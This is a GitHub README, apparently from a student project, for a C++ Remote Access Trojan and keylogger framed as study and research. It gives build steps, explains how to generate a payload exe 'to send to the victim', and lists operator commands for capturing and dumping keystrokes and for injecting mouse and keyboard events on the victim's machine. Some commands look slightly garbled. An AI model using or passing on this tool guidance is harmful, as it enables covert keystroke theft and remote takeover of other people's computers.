

# Project Title

Nghiên cứu, phát triển chương trình mã độc Remote Access Trojan

# PTITHCM_TTCS_NHOM1

Nội Dung:
- Tìm hiểu và xây dựng chương trình mã độc RAT, bằng ngôn ngữ C++ nhằm mục đích học tập & nghiên cứu
- Tìm hiểu và ứng dụng khai thác một lỗ hổng bảo mật trên Windows để triển khai mã độc.
- Tìm hiểu cách một chương trình mã độc được phát tán qua Email.
- 
Thực nghiệm:
- Xây dựng mã độc Remote Access Trojan và server quản lý tập trung máy tính nạn nhân


Nhóm 1 - Thành viên:
- Đinh Quốc Toàn 
- Lý Thanh Tuấn
- Đào Duy Tâm
- Nguyễn Trần Hùng Biện
- Đinh Văn Hậu

# Platforms
* Linux ✅️
* Windows ✅️


# Requirements
* GCC and MingWG on Linux and Termux
* MingWG on Windows

# Installation on Linux and Termux
```
git clone https://github.com/BluePhoenixxx/PTITHCM_TTCS_NHOM1.git
cd PTITHCM_TTCS_NHOM1
g++ main.cpp -o keylogger
./PTITHCM_TTCS_NHOM1
```
# Installation on Windows
```
g++ main.cpp -o keylogger.exe -lws2_32
.\keylogger.exe
```
# Sending the exe file to the victim
If you're working on Linux you need to install mingw for compiling C++ windows programs on linux.
install it using:
```
sudo apt-get install mingw-w64
```
And on termux using:
```
git clone https://github.com/mirror/mingw-w64.git;
cd mingw-w64\n";
./configure --prefix=$PREFIX --without-crt;
DESTDIR=$PREFIX make install;
```
# How to use KeyLogger?.
Set the local ip and port number using these commands.
```
lhost ip
lport port number
```
Then type exploit and the program will generate the .exe file that needs shall be send to the victim.
# KeyLogger Commands
```
SETTING OPTIONS: Set this options before lauching the attack!
Command                           Discribtion
-------                           ------------
lhost                              Sets the local host or ip address to listen on.
lport                              Sets the local port number to listen on. default 4444
exploit                            Run the script.
help                               Print this help message
clear                              Clear screen
exit                               Exit program
SESSION COMMANDS: This commands are only valid when a session is opened
LOGGING KEYSTROKES:
====================
keyscan_start                      Start capturing keystrokes
keyscan_dump                       Dump the captured keystrokes buffer.
keyscan_stop                       Stop capturing keystrokes.
SENDING MOUSE EVENTS:
=====================
mouse_move x y                     Move the mouse to x and y coordinates. The value range of x and y is 0-65535
mouse_click left                   Left click
mouse_click right                  Right click
mouse_click middle                 Click the middle mouse button
mouse_click double                 Double click the left mouse button
SENDING KEYBOARD EVENTS:
========================
keyboard_send                      Send keystrokes. This must be followed by the keys(or text) you want to send
keyevent                           Send keyboard events. like CTRL+C, ALT+F4.
                                    you must use the '+' sign to indicate that the keys should be press together.
                                    for a single key just type the key name example 'keyevent SHIFT' to press the shift key.
Supported keyevents:
A-Z, F1-F12, SHIFT, ENTER, SPACE, BACKSPACE, ALT, ESC, PAGEUP, PAGEDOWN, HOME, LEFTARROW, RIGHTARROW, UPARROW
DOWNARROW, PRINTSCRN, INSERT, DELETE, CAPS
These values are case sensetive. You must use them in upper case except for A-Z(you can use them in upper or lower case).
EXAMPLES:
keyboard_send You have been hacked!
keyevent CTRL+c
keyevent ALT+F4
keyevent ENTER
tmouse_move 2345 345
mouse_click right
```
